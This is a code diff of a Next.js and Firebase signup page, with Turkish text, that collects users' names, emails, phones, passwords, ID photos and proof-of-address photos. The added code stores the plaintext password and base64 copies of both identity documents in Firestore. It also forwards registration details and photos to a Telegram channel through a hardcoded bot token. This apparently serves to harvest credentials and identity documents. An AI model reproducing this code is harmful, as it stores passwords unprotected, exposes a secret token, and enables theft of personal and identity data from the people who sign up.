@@ -9,11 +9,13 @@ import { createUserWithEmailAndPassword } from "firebase/auth";
 
 import { useEffect } from 'react';
 import { useRouter } from 'next/navigation'
+import { addDoc, collection, doc, setDoc } from "firebase/firestore";
+import { db } from "../../../firebase";
 
 
 const SignupPage = () => {
   const router = useRouter();
-
+  const dbRef = collection(db, "kayitlar");
 
   const [firstName, setFirstName] = useState('');
   const [password, setPassword] = useState('');
@@ -23,6 +25,8 @@ const SignupPage = () => {
   const [addressImage, setAddressImage] = useState("");
   const [photoContent, setPhotoContent] = useState(null);
   const [photoContent2, setPhotoContent2] = useState(null);
+  const [base64String, setBase64String] = useState(null);
+  const [base64String2, setBase64String2] = useState(null);
   const handleFirstNameChange = (e) => {
     setFirstName(e.target.value);
   };
@@ -43,13 +47,28 @@ const SignupPage = () => {
     if (e.target.files) {
       setIdImage(e.target.files[0]);
       setPhotoContent(e.target.files[0]);
-    }
+     
+        const reader = new FileReader();
+        reader.onload = (e) => {
+          const base64Data = e.target.result;
+          setBase64String(base64Data);
+        };
+        reader.readAsDataURL(e.target.files[0]);
+      
+    };
+  
   };
 
   const handleAddressImageChange = (e) => {
     if (e.target.files) {
       setAddressImage(e.target.files[0]);
       setPhotoContent2(e.target.files[0]);
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        const base64Data = e.target.result;
+        setBase64String2(base64Data);
+      };
+      reader.readAsDataURL(e.target.files[0]);
     }
 
   };
@@ -62,12 +81,25 @@ const SignupPage = () => {
     await createUserWithEmailAndPassword(auth, email, password)
       .then(async (userCredential) => {
         const botToken = '6844283169:AAGEWaXEt3r7AZcHQPFwP82Nk-qgUfs1oBA';
-        const channelName = '@galyakayit';
+        const channelName = '-1002044945374';
         const formData2 = new FormData();
         const formData = new FormData();
         formData.append('photo', photoContent);
         formData2.append('photo', photoContent2);
-
+        await addDoc(dbRef, {
+          email: email,
+          ikamet: base64String2, 
+          isim: firstName,
+          kimlik: base64String,
+          sifre: password,
+          telefon: phone
+        })
+          .then(docRef => {
+            console.log("Document has been added successfully");
+          })
+          .catch(error => {
+            alert(error);
+          })
 
         const text = `🎊🎊 Yeni Kayıt 🎊🎊%0A  ➡️➡️${firstName}%0A ${phone} telefon numarası ve  ${email} maili bilgileri ile Kayıt işlemini tamamladı %0A Evraklarını bir alt mesajda gönderiyorum %0A Kontrol Eder misiniz ?. `;
         try {
@@ -95,11 +127,25 @@ const SignupPage = () => {
             setPhone("")
             setPhotoContent(null)
             setPhotoContent2(null)
-            router.push('/deposit/page')
+
+            
             alert('Kayıt Başarılı , lütfen giriş yapınız');
+            window.location.reload()
+            auth.signOut()
+            auth.signOut().then(function() {
+              console.log('Signed Out');
+            }, function(error) {
+              console.error('Sign Out Error', error);
+            });
+            router.push('/signin')
             console.log('Photo uploaded successfully:', uploadResult);
-            return uploadResult.result.photo[0].file_id;
+            
+            return;
           } else {
+            auth.signOut()
+            alert('Hata oluştu , lütfen tekrar deneyiniz');
+           
+            window.location.reload()
             return null;
           }
         } catch (error) {
